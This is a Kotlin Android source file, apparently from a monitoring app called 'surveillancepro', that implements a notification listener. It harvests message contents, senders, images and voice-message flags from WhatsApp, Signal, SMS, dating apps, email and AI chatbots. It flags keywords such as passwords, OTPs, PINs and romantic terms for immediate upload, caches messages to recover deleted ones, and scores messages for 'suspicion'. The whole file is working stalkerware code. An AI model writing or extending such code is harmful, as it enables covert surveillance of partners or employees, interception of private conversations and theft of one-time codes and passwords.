package com.surveillancepro.android.services

import android.app.Notification
import android.graphics.Bitmap
import android.graphics.drawable.Icon
import android.os.Build
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Base64
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.workers.SyncWorker
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * Service de capture des notifications ULTRA-PUISSANT.
 * 
 * Capture TOUS les messages de toutes les applications de messagerie:
 * - WhatsApp, Telegram, Signal, Messenger, Instagram, Snapchat, TikTok
 * - SMS, Emails, Apps de dating, Slack, Teams, Discord
 * - ChatGPT, Gemini, Claude et autres chatbots IA
 * 
 * Fonctionnalités avancées:
 * - Extraction des images des notifications (photos partagées)
 * - Détection des messages vocaux
 * - Capture des conversations de groupe
 * - Sync immédiat pour les messages importants
 * - Détection des mots-clés sensibles
 */
class SupervisionNotificationListener : NotificationListenerService() {
    
    companion object {
        private const val TAG = "NotificationListener"
        
        // Mots-clés sensibles qui déclenchent un sync immédiat
        private val SENSITIVE_KEYWORDS = listOf(
            "urgent", "important", "secret", "confidentiel", "privé",
            "password", "mot de passe", "code", "pin", "otp",
            "argent", "money", "paiement", "virement", "compte",
            "rencontre", "rendez-vous", "meeting", "rdv",
            "démission", "licenciement", "contrat",
            "love", "amour", "je t'aime", "bébé", "chéri",
        )
    }

    private var lastNotifKey = ""
    private var lastNotifTime = 0L

    private val monitoredApps = mapOf(
        // Messageries principales
        "com.whatsapp" to "WhatsApp",
        "com.whatsapp.w4b" to "WhatsApp Business",
        "org.telegram.messenger" to "Telegram",
        "org.telegram.messenger.web" to "Telegram",
        "com.facebook.orca" to "Messenger",
        "com.facebook.mlite" to "Messenger Lite",
        "com.instagram.android" to "Instagram",
        "com.snapchat.android" to "Snapchat",
        "org.thoughtcrime.securesms" to "Signal",
        // TikTok
        "com.tiktok.android" to "TikTok",
        "com.zhiliaoapp.musically" to "TikTok",
        "com.ss.android.ugc.trill" to "TikTok",
        // SMS
        "com.google.android.apps.messaging" to "Messages",
        "com.samsung.android.messaging" to "Samsung Messages",
        "com.android.mms" to "SMS",
        "com.sonyericsson.conversations" to "SMS",
        // Pro
        "com.slack" to "Slack",
        "com.microsoft.teams" to "Teams",
        "com.discord" to "Discord",
        "com.skype.raider" to "Skype",
        "com.viber.voip" to "Viber",
        // Chatbots IA
        "com.openai.chatgpt" to "ChatGPT",
        "com.google.android.apps.bard" to "Gemini",
        "com.anthropic.claude" to "Claude",
        // Autres messageries
        "com.tencent.mm" to "WeChat",
        "jp.naver.line.android" to "LINE",
        "com.imo.android.imoim" to "imo",
        "com.kakao.talk" to "KakaoTalk",
        "kik.android" to "Kik",
        "com.bbm" to "BBM",
        "com.hike.chat.stickers" to "Hike",
        // Dating
        "com.tinder" to "Tinder",
        "com.bumble.app" to "Bumble",
        "com.badoo.mobile" to "Badoo",
        // Email (notifications)
        "com.google.android.gm" to "Gmail",
        "com.microsoft.office.outlook" to "Outlook",
        "com.yahoo.mobile.client.android.mail" to "Yahoo Mail",
    )

    // Cache pour éviter les doublons
    private val recentMessages = LinkedHashMap<String, Long>(50, 0.75f, true)

    private val voiceMessagePatterns = listOf(
        "message vocal", "voice message", "audio", "ptt",
        "\uD83C\uDFA4", // microphone emoji
        "message audio", "nota de voz", "sprachnachricht",
    )

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        val packageName = sbn.packageName
        val appName = monitoredApps[packageName] ?: return

        val extras = sbn.notification.extras
        val title = extras.getCharSequence("android.title")?.toString() ?: ""
        val text = extras.getCharSequence("android.text")?.toString() ?: ""
        val bigText = extras.getCharSequence("android.bigText")?.toString()
        val subText = extras.getCharSequence("android.subText")?.toString()
        val infoText = extras.getCharSequence("android.infoText")?.toString()

        val messageContent = bigText ?: text
        if (messageContent.isBlank()) return

        // Déduplication améliorée par hash
        val notifKey = "$packageName|$title|${messageContent.take(100)}".hashCode().toString()
        val now = System.currentTimeMillis()
        
        // Vérifier dans le cache récent
        if (recentMessages.containsKey(notifKey) && now - (recentMessages[notifKey] ?: 0) < 5000) return
        
        // Nettoyer le cache si trop grand
        if (recentMessages.size > 100) {
            val oldest = recentMessages.keys.firstOrNull()
            if (oldest != null) recentMessages.remove(oldest)
        }
        recentMessages[notifKey] = now
        
        lastNotifKey = notifKey
        lastNotifTime = now

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())

        val isVoiceMessage = voiceMessagePatterns.any {
            messageContent.lowercase().contains(it) || text.lowercase().contains(it)
        }

        val payload = mutableMapOf<String, Any>(
            "app" to appName,
            "packageName" to packageName,
            "sender" to title,
            "message" to messageContent,
            "timestamp" to timestamp,
        )
        subText?.let { payload["group"] = it }
        infoText?.let { payload["info"] = it }
        if (isVoiceMessage) payload["isVoiceMessage"] = true

        // Extraire le nombre de messages non lus si disponible
        val number = sbn.notification.number
        if (number > 0) payload["unreadCount"] = number

        val queue = EventQueue.getInstance(applicationContext)
        
        // Type d'événement plus précis selon l'app
        val eventType = when {
            isVoiceMessage -> "voice_message"
            packageName.contains("gmail") || packageName.contains("outlook") || packageName.contains("mail") -> "email_notification"
            packageName.contains("tinder") || packageName.contains("bumble") || packageName.contains("badoo") -> "dating_message"
            else -> "message_captured"
        }
        
        // Extraire l'image de la notification si présente (photo partagée)
        try {
            val largeIcon = extras.getParcelable<Bitmap>("android.largeIcon")
            if (largeIcon != null && largeIcon.width > 50) {
                val imageBase64 = bitmapToBase64(largeIcon, 80)
                if (imageBase64.length < 500000) { // Max 500KB
                    payload["thumbnailBase64"] = imageBase64
                }
            }
        } catch (e: Exception) {
            Log.w(TAG, "Failed to extract notification image: ${e.message}")
        }
        
        // Vérifier si le message contient des mots-clés sensibles
        val isSensitive = SENSITIVE_KEYWORDS.any { keyword ->
            messageContent.lowercase().contains(keyword) || title.lowercase().contains(keyword)
        }
        if (isSensitive) {
            payload["isSensitive"] = true
            payload["priority"] = "high"
        }
        
        queue.enqueue(eventType, payload)
        
        // FONCTIONNALITÉS AVANCÉES:
        
        // 1. Cacher le message pour récupérer les messages supprimés
        DeletedMessageCapture.cacheMessage(packageName, title, messageContent, appName)
        
        // 2. Vérifier si c'est une notification de message supprimé
        DeletedMessageCapture.checkForDeletedMessage(applicationContext, packageName, title, messageContent, appName)
        
        // 3. Analyser le sentiment du message
        val analysis = SentimentAnalyzer.analyzeMessage(applicationContext, messageContent, title, appName, packageName)
        
        // Sync immédiat pour les messages sensibles, dating, ou suspects
        if (isSensitive || eventType == "dating_message" || analysis.suspicionScore >= 50) {
            SyncWorker.triggerNow(applicationContext)
        }
        
        Log.d(TAG, "Captured: $appName - $title (sensitive=$isSensitive, suspicion=${analysis.suspicionScore})")
    }
    
    /**
     * Convertit un Bitmap en Base64 avec compression.
     */
    private fun bitmapToBase64(bitmap: Bitmap, quality: Int): String {
        val outputStream = ByteArrayOutputStream()
        bitmap.compress(Bitmap.CompressFormat.JPEG, quality, outputStream)
        return Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
    }

    /**
     * Capture aussi quand une notification est supprimée (message lu)
     */
    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        val storage = DeviceStorage.getInstance(applicationContext)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        val packageName = sbn.packageName
        val appName = monitoredApps[packageName] ?: return

        val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).format(Date())
        val queue = EventQueue.getInstance(applicationContext)

        queue.enqueue("notification_read", mapOf(
            "app" to appName,
            "package" to packageName,
            "timestamp" to timestamp,
        ))
    }
}
